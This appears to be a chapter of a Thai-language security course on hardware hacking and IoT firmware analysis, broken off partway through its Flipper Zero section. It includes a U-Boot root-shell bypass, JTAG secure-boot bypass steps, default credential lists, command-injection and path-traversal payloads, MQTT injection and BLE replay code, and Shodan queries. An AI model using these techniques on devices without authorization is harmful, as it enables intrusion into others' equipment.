# Part 96: Hardware Hacking & Firmware Analysis (Steps 951-960)

## ภาพรวม
การวิเคราะห์ความปลอดภัยของ Hardware และ Firmware ในอุปกรณ์ IoT และระบบ Embedded
ครอบคลุมการติดต่อ UART/JTAG, การวิเคราะห์ Firmware, และการใช้เครื่องมือ Specialized

---

## Step 951: Hardware Hacking Fundamentals และ Tools

```python
from dataclasses import dataclass
from typing import List, Dict

@dataclass
class HardwareHackingFramework:
    """กรอบการทดสอบ Hardware Security"""
    
    HARDWARE_ATTACK_CATEGORIES = {
        "Physical Attacks": [
            "UART/JTAG debug interface exploitation",
            "SPI/I2C flash memory reading",
            "PCB trace analysis",
            "Component identification",
            "Memory chip extraction"
        ],
        "Firmware Analysis": [
            "Firmware extraction from device",
            "Binary analysis and reverse engineering",
            "File system extraction",
            "Hardcoded credential discovery",
            "Vulnerability analysis in firmware"
        ],
        "Network Protocol Analysis": [
            "Bluetooth/BLE sniffing",
            "Zigbee protocol analysis",
            "Z-Wave security testing",
            "RF protocol reverse engineering",
            "Custom protocol analysis"
        ],
        "Supply Chain": [
            "Counterfeit component detection",
            "Hardware implant detection",
            "Firmware integrity verification",
            "Secure boot analysis"
        ]
    }
    
    ESSENTIAL_TOOLS = {
        "Hardware": [
            {"name": "Bus Pirate", "purpose": "Universal serial interface (UART/SPI/I2C)"},
            {"name": "JTAGulator", "purpose": "Identify JTAG/UART pins automatically"},
            {"name": "Flipper Zero", "purpose": "Multi-tool for RF/NFC/RFID/GPIO"},
            {"name": "HackRF One", "purpose": "Software-defined radio (SDR)"},
            {"name": "Logic Analyzer (8ch)", "purpose": "Capture and decode digital signals"},
            {"name": "Raspberry Pi", "purpose": "GPIO-based protocol attacks"},
            {"name": "SOIC8 Clip", "purpose": "In-circuit SPI flash reading"},
            {"name": "CH341A Programmer", "purpose": "SPI/I2C flash memory programmer"}
        ],
        "Software": [
            {"name": "Binwalk", "purpose": "Firmware analysis and extraction"},
            {"name": "Ghidra/IDA Pro", "purpose": "Binary reverse engineering"},
            {"name": "OpenOCD", "purpose": "JTAG/SWD debugging"},
            {"name": "Firmwalker", "purpose": "Firmware security analysis"},
            {"name": "EMBA", "purpose": "Embedded firmware security analyzer"},
            {"name": "FAT (Firmware Analysis Toolkit)", "purpose": "Firmware emulation and analysis"},
            {"name": "FACT (Firmware Analysis & Comparison Tool)", "purpose": "Automated firmware analysis"}
        ]
    }
    
    INTERFACE_VOLTAGES = {
        "TTL (3.3V)": "Most modern embedded devices",
        "TTL (5V)": "Older devices, Arduino",
        "CMOS (1.8V)": "Low-power IoT devices",
        "RS-232": "Legacy serial (needs level shifter)"
    }
    
    def iot_attack_checklist(self) -> List[str]:
        """รายการการทดสอบ IoT Security"""
        return [
            "Physical inspection: identify chips, connectors, test points",
            "Check for UART/JTAG/SWD debug interfaces",
            "Attempt bootloader access via debug interface",
            "Extract firmware via UART bootloader",
            "Extract firmware via SPI flash chip clip",
            "Analyze firmware with binwalk",
            "Search for hardcoded credentials",
            "Check for outdated/vulnerable software versions",
            "Analyze network communications",
            "Test web interface if present",
            "Test update mechanism security",
            "Check for debug credentials in production firmware"
        ]

if __name__ == "__main__":
    hw = HardwareHackingFramework()
    print("Hardware Attack Categories:")
    for cat, attacks in hw.HARDWARE_ATTACK_CATEGORIES.items():
        print(f"  {cat}:")
        for attack in attacks[:3]:
            print(f"    - {attack}")
    
    print("\nEssential Hardware Tools:")
    for tool in hw.ESSENTIAL_TOOLS["Hardware"][:5]:
        print(f"  {tool['name']}: {tool['purpose']}")
    
    checklist = hw.iot_attack_checklist()
    print(f"\nIoT Attack Checklist: {len(checklist)} items")
```

---

## Step 952: UART Interface Exploitation

```python
from dataclasses import dataclass
from typing import List, Dict, Optional
import time

class UARTExploitation:
    """การใช้งาน UART Interface เพื่อเข้าถึงระบบ"""
    
    UART_PIN_IDENTIFICATION = """
# การเป็น UART Pins ด้วย Multimeter/Oscilloscope

## การระบุ GND:
- ใช้ Continuity mode ใน Multimeter
- Test กับ Known GND point (USB shield, power supply GND)
- GND จะมี Continuity

## การระบุ VCC:
- Measure voltage กับ GND
- ยิ่งเป็น +3.3V หรือ +5V

## การระบุ TX:
- ใช้ oscilloscope หรือ logic analyzer
- ในช่วงบูต TX จะมี activity (toggling)
- Set to DC coupling, measure 3.3V baseline

## การระบุ RX:
- Pin ที่เหลือ = RX
- RX จะไม่มีสัญญาณในช่วงบูต

## JTAGulator Automated:
# เชื่อมต่อ JTAGulator ผ่าน USB
screen /dev/ttyUSB0 115200

# บน JTAGulator terminal:
U        # UART Discovery mode
3.3      # Set voltage to 3.3V
0        # เลือก channels (0-23)
        # JTAGulator จะ scan หา baud rate อัตโนมัติ
"""
    
    MINICOM_CONNECTION = """
# เชื่อมต่อ UART ด้วย minicom/screen

# ติดตั้ง
# sudo apt install minicom screen

# เชื่อมต่อ (USB-to-Serial adapter)
screen /dev/ttyUSB0 115200
# or
minicom -D /dev/ttyUSB0 -b 115200

# ถ้าไม่รู้ baud rate:
# ทดลอง: 9600, 38400, 57600, 115200
# หรือใช้ baudrate scanner
baudrate-scanner /dev/ttyUSB0
"""
    
    BOOTLOADER_INTERRUPTION = """
# U-Boot Bootloader Interruption
# U-Boot คือ bootloader ยอดนิยมในอุปกรณ์ Embedded Linux

1. เชื่อมต่อ UART
2. รีสตาร์เครื่อง
3. กด Enter/Space หรือ 's' หรือ Ctrl+C ในช่วงบูต
4. จะได้ U-Boot prompt: =>

# U-Boot Commands:
printenv        # แสดง environment variables (อาจมี credentials)
help            # แสดงคำสั่งทั้งหมด
nand read ...   # อ่าน NAND flash
tftp ...        # โหลดไฟล์ผ่าน TFTP
setenv bootargs "init=/bin/sh"  # Boot โดยไม่ต้องล้อเข้าระบบ
boot            # บูตด้วยค่าใหม่

# คำสั่งพิเศษสำหรับเข้าเป็น root:
# 1. setenv bootargs 'root=/dev/mtdblock2 init=/bin/sh'
# 2. boot
# 3. Linux shell แบบ root โดยไม่ต้องใส่รหัสผ่าน
"""
    
    DEFAULT_CREDENTIALS = [
        ("root", "root"),
        ("root", "admin"),
        ("root", "1234"),
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", ""),
        ("root", ""),
        ("user", "user"),
        ("guest", "guest")
    ]
    
    def identify_uart_baud_rate(self, device: str) -> str:
        """Generate baud rate scanning script"""
        return f"""
#!/bin/bash
# UART Baud Rate Scanner for {device}

DEVICE="/dev/ttyUSB0"
BAUD_RATES=(1200 2400 4800 9600 19200 38400 57600 115200 230400)

for BAUD in ${{BAUD_RATES[@]}}; do
    echo "Testing baud rate: $BAUD"
    timeout 3 screen $DEVICE $BAUD 2>/dev/null &
    SCREEN_PID=$!
    sleep 2
    kill $SCREEN_PID 2>/dev/null
done
"""

if __name__ == "__main__":
    uart = UARTExploitation()
    print("Default Credentials to Try:")
    for creds in uart.DEFAULT_CREDENTIALS:
        print(f"  {creds[0]}:{creds[1]}")
    
    print("\nBaud Rate Scanner:")
    print(uart.identify_uart_baud_rate("Router XYZ")[:300])
```

---

## Step 953: JTAG/SWD Debug Interface Exploitation

```python
from dataclasses import dataclass
from typing import List, Dict

class JTAGExploitation:
    """การใช้ JTAG/SWD สำหรับ Hardware Debugging"""
    
    JTAG_OVERVIEW = """
# JTAG (Joint Test Action Group)
# IEEE 1149.1 Standard

## JTAG Pins:
- TDI  - Test Data In
- TDO  - Test Data Out
- TCK  - Test Clock
- TMS  - Test Mode Select
- TRST - Test Reset (optional)

## SWD (Serial Wire Debug) - ARM alternative to JTAG:
- SWDIO - Data IO
- SWCLK - Clock
- GND
- VCC (optional)

## Uses:
- Memory read/write
- CPU register access
- Flash programming/reading
- Runtime debugging
- Bypass secure boot
"""
    
    OPENOCD_COMMANDS = """
# OpenOCD - Open On-Chip Debugger
# sudo apt install openocd

# เชื่อมต่อด้วย Raspberry Pi as JTAG
openocd -f interface/raspberrypi2-native.cfg \\
    -f target/stm32f1x.cfg

# เชื่อมต่อด้วย J-Link
openocd -f interface/jlink.cfg \\
    -f target/nrf52.cfg

# OpenOCD Commands (in telnet session):
telnet localhost 4444

halt                    # Halt CPU
reset halt              # Reset and halt
flash banks             # List flash regions
flash info 0            # Flash info
flash read_bank 0 dump.bin 0 0x100000  # Dump flash
dump_image firmware.bin 0x08000000 0x80000  # Read flash to file
resume                  # Resume execution

# GDB via OpenOCD:
gdb-multiarch firmware.elf
(gdb) target remote localhost:3333
(gdb) monitor halt
(gdb) info registers
(gdb) x/10x 0x08000000  # Examine memory
"""
    
    SECURE_BOOT_BYPASS = """
# Secure Boot Bypass via JTAG

# Scenario: Device won't boot modified firmware
# JTAG can read/write memory during runtime

# Step 1: Attach JTAG and halt CPU at boot
openocd -f interface/jlink.cfg -f target/cortex_m.cfg
telnet localhost 4444
> reset halt

# Step 2: Find boot verification code
# Use GDB to disassemble boot code
gdb-multiarch
(gdb) target remote localhost:3333
(gdb) monitor halt
(gdb) disassemble 0x08000000  # Analyze boot code

# Step 3: Patch verification in memory (not flash)
# Find signature check return value
(gdb) set *0x2000xxxx = 1  # Patch in RAM to bypass check
(gdb) continue

# Step 4: For permanent bypass - write to flash
# (if JTAG has write access)
(gdb) monitor flash write_image erase backdoor.bin 0x08000000
"""
    
    def generate_jtagulator_config(self) -> str:
        """JTAGulator configuration guide"""
        return """
# JTAGulator - Automated JTAG Pin Identification
# Hardware: connect target pins to JTAGulator channels
# Software: serial terminal at 115200 baud

# ขั้นตอน:
1. เชื่อม JTAGulator USB
2. screen /dev/ttyUSB0 115200
3. เลือกไฟ voltage: V -> 3.3V -> 'V'
4. เลือกโหมด JTAG: 'J'
5. เลือก channels: 0-23 (all)
6. JTAGulator scan IDCODE
7. Identified pins will show with target IDCODE

# IDCODE examples:
# 0x4BA00477 = ARM Cortex-M (most common)
# 0x0BA00477 = ARM Cortex-A
# 0x069aa05D = MIPS processor
"""

if __name__ == "__main__":
    jtag = JTAGExploitation()
    print("JTAG Overview:")
    print(jtag.JTAG_OVERVIEW[:400])
    print("\nOpenOCD Key Commands:")
    print(jtag.OPENOCD_COMMANDS[:400])
```

---

## Step 954: SPI Flash Memory Reading

```python
from dataclasses import dataclass
from typing import List, Dict

class SPIFlashAnalysis:
    """การอ่าน SPI Flash Memory จากอุปกรณ์"""
    
    SPI_FLASH_OVERVIEW = """
# SPI Flash Memory - สัญลักษณ์

## ประเภทโหลด Flash ที่พบบ่อย:
- Winbond W25Qxx (W25Q64, W25Q128, etc.)
- Spansion/Cypress S25FLxxx
- Macronix MX25Lxxx
- ISSI IS25LPxxx

## Package Types:
- SOIC8 (8-pin DIP-style)
- WSON8 (8-pad SMD)
- DFN8

## Pins (SOIC8):
Pin 1: CS# (Chip Select - active low)
Pin 2: SO (Serial Out / MISO)
Pin 3: WP# (Write Protect)
Pin 4: GND
Pin 5: SI (Serial In / MOSI)
Pin 6: CLK (Clock)
Pin 7: HOLD#
Pin 8: VCC (3.3V)

## การอ่าน In-Circuit (In-System Programming):
- ใช้ SOIC8 Clip + CH341A programmer
- ไม่ต้องถอด chip ออก
"""
    
    FLASHROM_COMMANDS = """
# Flashrom - Universal Flash Programmer
# sudo apt install flashrom

# Read flash via CH341A programmer:
sudo flashrom -p ch341a_spi -r firmware.bin

# Via Raspberry Pi SPI:
sudo flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -r firmware.bin

# Via Bus Pirate:
sudo flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r firmware.bin

# Identify chip:
sudo flashrom -p ch341a_spi --flash-name

# Write new firmware:
sudo flashrom -p ch341a_spi -w modified_firmware.bin

# Verify write:
sudo flashrom -p ch341a_spi -v firmware.bin

# Read specific region:
sudo flashrom -p ch341a_spi -r bootloader.bin \\
    --ifd --image bios
"""
    
    FIRMWARE_READING_TECHNIQUES = [
        {
            "method": "SOIC8 Clip + CH341A",
            "difficulty": "Easy",
            "requires_desoldering": False,
            "description": "Clip onto flash chip while in-circuit"
        },
        {
            "method": "Desolder and socket",
            "difficulty": "Medium",
            "requires_desoldering": True,
            "description": "Remove chip, read in programmer socket"
        },
        {
            "method": "UART bootloader",
            "difficulty": "Easy",
            "requires_desoldering": False,
            "description": "Use bootloader UART commands to dump flash"
        },
        {
            "method": "JTAG/OpenOCD",
            "difficulty": "Medium",
            "requires_desoldering": False,
            "description": "Use JTAG interface to read flash"
        },
        {
            "method": "OS command via shell",
            "difficulty": "Trivial",
            "requires_desoldering": False,
            "description": "cat /dev/mtd0 if you have shell access"
        }
    ]
    
    def generate_soic8_wiring_guide(self) -> str:
        """Guide สำหรับต่อสาย SOIC8"""
        return """
# SOIC8 Clip Wiring to CH341A

SOIC8 Pin -> CH341A Pin
1 (CS#)  -> CS
2 (SO)   -> SO (MISO)
3 (WP#)  -> VCC (3.3V) [disable write protect]
4 (GND)  -> GND
5 (SI)   -> SI (MOSI)
6 (CLK)  -> CLK
7 (HOLD#)-> VCC (3.3V) [disable hold]
8 (VCC)  -> VCC (3.3V)

# IMPORTANT:
# - Power OFF device before attaching clip
# - Or power device and bypass with ONLY 3.3V from programmer
# - Check if device has pull-up resistors that may conflict
# - Some boards need device powered ON for clock signal
"""

if __name__ == "__main__":
    spi = SPIFlashAnalysis()
    print("SPI Flash Reading Techniques:")
    for tech in spi.FIRMWARE_READING_TECHNIQUES:
        print(f"  {tech['method']}: {tech['description']} (Difficulty: {tech['difficulty']})")
    
    print("\nFlashrom Commands (excerpt):")
    print(spi.FLASHROM_COMMANDS[:300])
```

---

## Step 955: Firmware Analysis with Binwalk

```python
import subprocess
import os
from pathlib import Path
from dataclasses import dataclass
from typing import List, Dict

class FirmwareAnalyzer:
    """การวิเคราะห์ Firmware ด้วย Binwalk และเครื่องมืออื่น"""
    
    BINWALK_COMMANDS = """
# Binwalk - Firmware Analysis Tool
# sudo apt install binwalk  or pip install binwalk

# Basic scan - identify file types in firmware
binwalk firmware.bin

# Extract all identified files
binwalk -e firmware.bin
# Files extracted to _firmware.bin.extracted/

# Recursive extraction
binwalk -Me firmware.bin  # -M=matryoshka (recursive), -e=extract

# Entropy analysis (detect encryption/compression)
binwalk -E firmware.bin
# Low entropy = readable data
# High entropy = encrypted/compressed

# Show raw signature results
binwalk -B firmware.bin

# Disassemble binary for specific arch
binwalk -A firmware.bin  # Scan for instructions

# Calculate hash of sections
binwalk -H firmware.bin

# Fast scanning
binwalk -C -e firmware.bin
"""
    
    FILESYSTEM_ANALYSIS = """
# After Binwalk Extraction - Filesystem Analysis

# Common filesystems in embedded:
# - SquashFS (compressed read-only)
# - JFFS2 (NAND flash)
# - UBIFS (UBI volumes)
# - cramfs
# - ext2/ext3

# Navigate extracted filesystem
cd _firmware.bin.extracted/squashfs-root/
ls -la

# Look for configuration files
find . -name "*.conf" -o -name "*.cfg" -o -name "*.xml" 2>/dev/null

# Find credential files
grep -r "password" ./etc/ 2>/dev/null
grep -r "passwd" ./etc/ 2>/dev/null
cat ./etc/shadow 2>/dev/null  # Hashed passwords
cat ./etc/passwd 2>/dev/null  # User accounts

# Find scripts with embedded credentials
grep -r "pass=" ./ 2>/dev/null
grep -r "password=" ./ 2>/dev/null
grep -rE "([A-Za-z0-9+/]{40,})" ./ 2>/dev/null  # Base64

# Find SSL certificates and private keys
find . -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null

# Find hardcoded strings in binaries
strings ./usr/sbin/httpd | grep -i "pass\|admin\|secret"
"""
    
    FIRMWALKER_SCRIPT = """
# Firmwalker - Automated Firmware Security Analysis
# github.com/craigz28/firmwalker

bash firmwalker.sh /path/to/extracted_firmware/ output.txt

# Firmwalker checks for:
# - Passwords in config files
# - SSL private keys
# - SSH authorized keys
# - .ssh directories
# - Interesting binaries (su, sudo)
# - IP addresses and URLs
# - Shell scripts with potential issues
# - Web server config files
"""
    
    EMBA_ANALYSIS = """
# EMBA - Embedded Linux Analyzer
# github.com/e-m-b-a/emba

# Docker installation:
docker pull embeddedanalysis/emba

# Run analysis:
./emba.sh -f ./firmware.bin -l ./output -p ./profile/default-scan.emba

# EMBA analyzes:
# - Kernel version and known CVEs
# - Installed software versions
# - Password policy
# - Network services
# - Certificate issues
# - Hardcoded credentials
"""
    
    def extract_strings_from_binary(self, binary_path: str, min_length: int = 8) -> List[str]:
        """Extract readable strings from binary"""
        try:
            result = subprocess.run(
                ["strings", f"-n{min_length}", binary_path],
                capture_output=True, text=True, timeout=30
            )
            return result.stdout.strip().split("\n")
        except Exception as e:
            return [f"Error: {e}"]
    
    def search_credentials_in_filesystem(self, fs_root: str) -> Dict:
        """Search for credentials in extracted filesystem"""
        findings = {
            "etc_passwd": [],
            "etc_shadow": [],
            "config_files": [],
            "private_keys": []
        }
        
        path = Path(fs_root)
        
        # Check passwd file
        passwd_file = path / "etc" / "passwd"
        if passwd_file.exists():
            findings["etc_passwd"] = passwd_file.read_text().strip().split("\n")
        
        # Check shadow file
        shadow_file = path / "etc" / "shadow"
        if shadow_file.exists():
            findings["etc_shadow"] = shadow_file.read_text().strip().split("\n")
        
        # Find private keys
        for key_file in path.rglob("*.pem"):
            content = key_file.read_text(errors="ignore")
            if "PRIVATE KEY" in content:
                findings["private_keys"].append(str(key_file))
        
        return findings

if __name__ == "__main__":
    analyzer = FirmwareAnalyzer()
    print("Binwalk Key Commands:")
    print(analyzer.BINWALK_COMMANDS[:400])
    print("\nFilesystem Analysis:")
    print(analyzer.FILESYSTEM_ANALYSIS[:400])
```

---

## Step 956: IoT Network Protocol Analysis

```python
from dataclasses import dataclass
from typing import List, Dict

class IoTProtocolAnalysis:
    """การวิเคราะห์โปรโตคอล IoT"""
    
    IOT_PROTOCOLS = {
        "Bluetooth/BLE": {
            "frequency": "2.4 GHz",
            "range": "10-100m",
            "tools": ["Ubertooth One", "BLE Sniffer", "BlueZ", "btlejack"],
            "attacks": ["Sniffing", "MITM", "Replay", "BlueBorne", "BIAS"]
        },
        "Zigbee": {
            "frequency": "2.4 GHz / 868/915 MHz",
            "range": "10-100m",
            "tools": ["HackRF One", "CC2531 Zigbee Sniffer", "KillerBee"],
            "attacks": ["Sniffing", "Network injection", "Key extraction"]
        },
        "Z-Wave": {
            "frequency": "868.42 MHz (EU) / 908.42 MHz (US)",
            "range": "30m",
            "tools": ["HackRF One", "RTL-SDR", "Z-Wave sniffer"],
            "attacks": ["Jamming", "Replay", "Downgrade attack"]
        },
        "MQTT": {
            "transport": "TCP Port 1883 (unencrypted) / 8883 (TLS)",
            "tools": ["Wireshark", "mqtt-pwn", "mosquitto client"],
            "attacks": ["Subscribe all topics", "Credential brute force", "Message injection"]
        },
        "CoAP": {
            "transport": "UDP Port 5683",
            "tools": ["libcoap", "coap-client", "aiocoap"],
            "attacks": ["Amplification DDoS", "Resource enumeration"]
        },
        "RF (433/915 MHz)": {
            "frequency": "433 MHz / 915 MHz",
            "tools": ["RTL-SDR", "HackRF", "Flipper Zero"],
            "attacks": ["Replay attack", "Signal analysis", "Jamming"]
        }
    }
    
    BLE_ATTACK_CODE = '''
# BLE Sniffing with Python (bleak library)
import asyncio
from bleak import BleakScanner, BleakClient

async def scan_ble_devices():
    """Scan for BLE devices nearby"""
    devices = await BleakScanner.discover(timeout=10.0)
    for device in devices:
        print(f"Name: {device.name}")
        print(f"  Address: {device.address}")
        print(f"  RSSI: {device.rssi} dBm")
        if device.metadata.get("manufacturer_data"):
            print(f"  Manufacturer: {device.metadata['manufacturer_data']}")
        print()
    return devices

async def enumerate_ble_services(address: str):
    """Connect and enumerate BLE services"""
    async with BleakClient(address) as client:
        print(f"Connected to {address}")
        
        for service in client.services:
            print(f"Service: {service.uuid} - {service.description}")
            for char in service.characteristics:
                props = ",".join(char.properties)
                print(f"  Characteristic: {char.uuid} [{props}]")
                
                # Read readable characteristics
                if "read" in char.properties:
                    try:
                        value = await client.read_gatt_char(char.uuid)
                        print(f"    Value: {value.hex()} ({value})")
                    except Exception as e:
                        print(f"    Read error: {e}")

async def ble_replay_attack(address: str, char_uuid: str, payload: bytes):
    """Replay a BLE command"""
    async with BleakClient(address) as client:
        # Write payload to characteristic
        await client.write_gatt_char(char_uuid, payload)
        print(f"Written {payload.hex()} to {char_uuid}")

if __name__ == "__main__":
    asyncio.run(scan_ble_devices())
'''
    
    MQTT_ATTACKS = '''
# MQTT Security Testing
# pip install paho-mqtt

import paho.mqtt.client as mqtt

def mqtt_subscribe_all(broker_ip: str, port: int = 1883):
    """Subscribe to all MQTT topics"""
    def on_connect(client, userdata, flags, rc):
        print(f"Connected: {rc}")
        client.subscribe("#")  # Subscribe to ALL topics
    
    def on_message(client, userdata, msg):
        print(f"Topic: {msg.topic}")
        print(f"Payload: {msg.payload}")
    
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    
    # Try anonymous access first
    client.connect(broker_ip, port, 60)
    client.loop_forever()

def mqtt_inject_command(broker_ip: str, topic: str, payload: str):
    """Inject command via MQTT"""
    client = mqtt.Client()
    client.connect(broker_ip, 1883, 60)
    client.publish(topic, payload, qos=2)
    print(f"Injected: {payload} to {topic}")
    client.disconnect()
'''
    
    def generate_iot_recon_script(self) -> str:
        """Script สำหรับ IoT Reconnaissance"""
        return '''
#!/bin/bash
# IoT Network Reconnaissance

NETWORK="192.168.1.0/24"

echo "[*] Scanning for IoT devices..."
nmap -sV -p 80,443,23,22,554,8080,1883,8883,5683 $NETWORK

echo "\n[*] Check for MQTT brokers..."
nmap -sV -p 1883,8883 $NETWORK

echo "\n[*] Check for Telnet (common in IoT)..."
nmap -p 23 --open $NETWORK

echo "\n[*] Check for RTSP streams..."
nmap -p 554 --open $NETWORK
'''

if __name__ == "__main__":
    iot = IoTProtocolAnalysis()
    print("IoT Protocols:")
    for protocol, info in iot.IOT_PROTOCOLS.items():
        print(f"  {protocol}: {', '.join(info['attacks'][:2])}")
    
    print("\nIoT Recon Script (excerpt):")
    print(iot.generate_iot_recon_script()[:300])
```

---

## Step 957: Firmware Reverse Engineering

```python
from dataclasses import dataclass
from typing import List, Dict

class FirmwareReverseEngineering:
    """การทำ Reverse Engineering กับ Firmware"""
    
    COMMON_ARCHITECTURES = {
        "ARM Cortex-M": {
            "endian": "Little",
            "word_size": 32,
            "tools": ["Ghidra", "IDA Pro", "Binary Ninja", "Binwalk -A"],
            "common_in": "STM32, Nordic nRF, Microchip SAM"
        },
        "MIPS": {
            "endian": "Big or Little",
            "word_size": 32,
            "tools": ["Ghidra", "IDA Pro"],
            "common_in": "Routers (Atheros, MediaTek, Broadcom)"
        },
        "ARM Linux (32/64-bit)": {
            "endian": "Little",
            "word_size": 32,
            "tools": ["Ghidra", "IDA Pro", "Cutter"],
            "common_in": "Raspberry Pi, NVR cameras, Smart TVs"
        },
        "x86/x86_64": {
            "endian": "Little",
            "word_size": 32,
            "tools": ["All reverse engineering tools"],
            "common_in": "PC-based IoT, NAS devices"
        }
    }
    
    GHIDRA_WORKFLOW = """
# Ghidra Firmware Analysis Workflow

# 1. Import firmware binary
# File -> New Project -> Import File
# Select architecture (ARM LE 32-bit, MIPS BE 32-bit, etc.)

# 2. Analyze
# Analysis -> Auto Analyze
# Enable: Decompiler, Function ID, Function Start Analysis

# 3. Find interesting functions via Symbol Table
# Window -> Symbol Table
# Search for: strcmp, strcpy, system, popen, execve

# 4. Find hardcoded strings
# Search -> Search Memory -> Search for string
# Look for: password, admin, secret, key, token

# 5. Analyze web server handler functions
# Find functions called when HTTP requests processed
# Look for CGI handlers, URL routing

# 6. Trace authentication flow
# Find strcmp used for password comparison
# Trace back to find compared values

# 7. Find memory corruption vulnerabilities
# Look for: gets(), strcpy(), sprintf() without bounds
# Check for buffer overflow patterns
"""
    
    STRINGS_ANALYSIS = '''
import subprocess
from collections import Counter

class StringsAnalyzer:
    """Analyze strings found in firmware binary"""
    
    INTERESTING_PATTERNS = [
        r"[Pp]assword",
        r"[Aa]dmin",
        r"[Ss]ecret",
        r"[Aa][Pp][Ii][_\\s][Kk]ey",
        r"eyJ[A-Za-z0-9_-]+",  # JWT token
        r"[A-Fa-f0-9]{32,}",   # Possible hash/key
        r"https?://",           # URLs
        r"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}"  # IP addresses
    ]
    
    def extract_and_analyze(self, binary_path: str) -> dict:
        """Extract strings and categorize findings"""
        import re
        
        try:
            result = subprocess.run(
                ["strings", "-n", "8", binary_path],
                capture_output=True, text=True, timeout=60
            )
            strings = result.stdout.split("\\n")
        except:
            return {"error": "strings command failed"}
        
        findings = {"credentials": [], "urls": [], "ips": [], "misc_interesting": []}
        
        for s in strings:
            if re.search(r"(?i)(pass|secret|key|token|auth)", s):
                findings["credentials"].append(s)
            elif re.search(r"https?://", s):
                findings["urls"].append(s)
            elif re.search(r"\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b", s):
                findings["ips"].append(s)
        
        return findings
'''
    
    def identify_compression(self, firmware_path: str) -> str:
        """Identify compression/encryption in firmware sections"""
        analysis_steps = [
            f"binwalk -E {firmware_path}  # Entropy analysis",
            f"binwalk {firmware_path}     # Identify file types",
            f"file {firmware_path}        # Basic file type",
            f"hexdump -C {firmware_path} | head -50  # Check magic bytes"
        ]
        return "\n".join(analysis_steps)

if __name__ == "__main__":
    fw_re = FirmwareReverseEngineering()
    print("Common Firmware Architectures:")
    for arch, info in fw_re.COMMON_ARCHITECTURES.items():
        print(f"  {arch}: {info['common_in']}")
    
    print("\nGhidra Workflow (excerpt):")
    print(fw_re.GHIDRA_WORKFLOW[:400])
```

---

## Step 958: IoT Vulnerability Research

```python
from dataclasses import dataclass
from typing import List, Dict

class IoTVulnerabilityResearch:
    """การวิจัยความอ่อนแอในอุปกรณ์ IoT"""
    
    OWASP_IOT_TOP10_2018 = [
        "I1: Weak, Guessable, or Hardcoded Passwords",
        "I2: Insecure Network Services",
        "I3: Insecure Ecosystem Interfaces",
        "I4: Lack of Secure Update Mechanism",
        "I5: Use of Insecure or Outdated Components",
        "I6: Insufficient Privacy Protection",
        "I7: Insecure Data Transfer and Storage",
        "I8: Lack of Device Management",
        "I9: Insecure Default Settings",
        "I10: Lack of Physical Hardening"
    ]
    
    COMMON_IOT_VULNERABILITIES = {
        "Hardcoded Credentials": {
            "cve_example": "CVE-2016-1000000",
            "description": "Admin credentials embedded in firmware",
            "impact": "Full device compromise",
            "find_method": "strings firmware.bin | grep -i pass"
        },
        "Command Injection": {
            "description": "Web interface passes user input to system()",
            "payload": "; id",
            "example_vulnerable_code": "system('ping ' + user_input)"
        },
        "Insecure Update Mechanism": {
            "description": "Firmware updates not signed or verified",
            "attack": "Upload malicious firmware as update",
            "impact": "Persistent full compromise"
        },
        "Universal Plug and Play (UPnP) Exposure": {
            "description": "UPnP exposed on WAN interface",
            "tool": "Miranda UPNP, Metasploit",
            "impact": "Port forwarding, SSRF to internal network"
        },
        "Telnet/FTP Enabled": {
            "description": "Cleartext protocols with default creds",
            "ports": [21, 23],
            "impact": "Remote root access"
        }
    }
    
    SHODAN_IOT_QUERIES = [
        'port:23 telnet router',
        'product:"RouterOS"',
        'product:"D-Link"',
        'product:"NETGEAR"',
        'port:554 rtsp',
        'port:8080 webcam',
        'default password',
        'server:mini_httpd',
        'port:1883 MQTT',
        'net:TARGET_NETWORK port:23'
    ]
    
    def web_interface_test_cases(self) -> List[Dict]:
        """ลำดับการทดสอบ Web Interface สำหรับ IoT"""
        return [
            {
                "test": "Default Credentials",
                "payloads": ["admin/admin", "admin/1234", "root/root"],
                "impact": "Authentication bypass"
            },
            {
                "test": "Command Injection",
                "targets": ["ping", "traceroute", "nslookup features"],
                "payloads": ["; id", "| id", "&& id", "`id`"],
                "impact": "Remote code execution"
            },
            {
                "test": "Path Traversal",
                "payloads": ["../../../etc/passwd", "..%2F..%2Fetc%2Fshadow"],
                "impact": "File system access"
            },
            {
                "test": "Authentication Bypass",
                "method": "Access admin pages without login (IDOR)",
                "targets": ["/admin", "/cgi-bin/admin", "/config"],
                "impact": "Configuration access"
            },
            {
                "test": "Unencrypted Firmware Update",
                "method": "Upload .bin file with modified content",
                "impact": "Persistent backdoor"
            }
        ]

if __name__ == "__main__":
    iot_vuln = IoTVulnerabilityResearch()
    print("OWASP IoT Top 10:")
    for vuln in iot_vuln.OWASP_IOT_TOP10_2018:
        print(f"  {vuln}")
    
    tests = iot_vuln.web_interface_test_cases()
    print(f"\nWeb Interface Tests: {len(tests)}")
    for test in tests[:3]:
        print(f"  {test['test']}: {test['impact']}")
```

---

## Step 959: Hardware Security Tools - Flipper Zero

```python
from dataclasses import dataclass
from typing import List, Dict

class FlipperZeroGuide:
    """คู่มือการใช้ Flipper Zero สำหรับการทดสอบ Hardware"""
    
    FLIPPER_CAPABILITIES = {
        "Sub-GHz Radio": {
            "description": "Receive/transmit on 300-928 MHz",
            "attacks": [
                "Record and replay 433/915 MHz signals",
                "Analyze custom RF protocols",
                "Garage door/car key fob analysis",
                "Rolling code analysis"
            ]
        },
        "125 kHz RFID": {
            "description": "Low frequency RFID reader/writer",
            "attacks": [
                "Clone EM4100 cards",
                "Clone HID Prox cards",
                "Read and emulate access cards"
            ]
        },
        "NFC": {
            "description": "13.56 MHz NFC reader/writer",
            "attacks": [
                "Clone NFC cards (Mifare Classic)",
                "Read bank card info (NDEF)",
                "Emulate NFC tags"
            ]
        },
        "Infrared": {
            "description": "IR signal capture and transmit",
            "attacks": [
                "Capture TV/AC remotes",
                "Replay IR commands",
                "Universal remote control"
            ]
        },
        "iButton": {
            "description": "1-Wire iButton reader/emulator",
            "attacks": [
                "Clone iButton keys (used in elevators, doors)",
                "Read and emulate Dallas key fobs"
            ]
        },
        "GPIO/Hardware": {
            "description": "GPIO pins for hardware hacking",
            "attacks": [
                "UART connection to devices",
                "SPI/I2C communication",
